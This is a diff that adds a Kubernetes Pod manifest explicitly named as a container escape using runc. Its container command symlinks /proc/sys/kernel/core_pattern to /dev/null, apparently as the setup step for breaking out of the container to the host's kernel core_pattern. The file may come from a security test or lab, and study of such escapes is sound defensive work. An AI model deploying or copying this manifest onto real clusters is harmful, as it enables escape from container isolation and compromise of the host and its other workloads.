@@ -1,0 +1,12 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: container-escape-using-runc
+spec:
+  restartPolicy: Never
+  containers:
+  - name: container-escape-using-runc
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ['-c', 'ln -s /proc/sys/kernel/core_pattern /dev/null; sleep infinity']
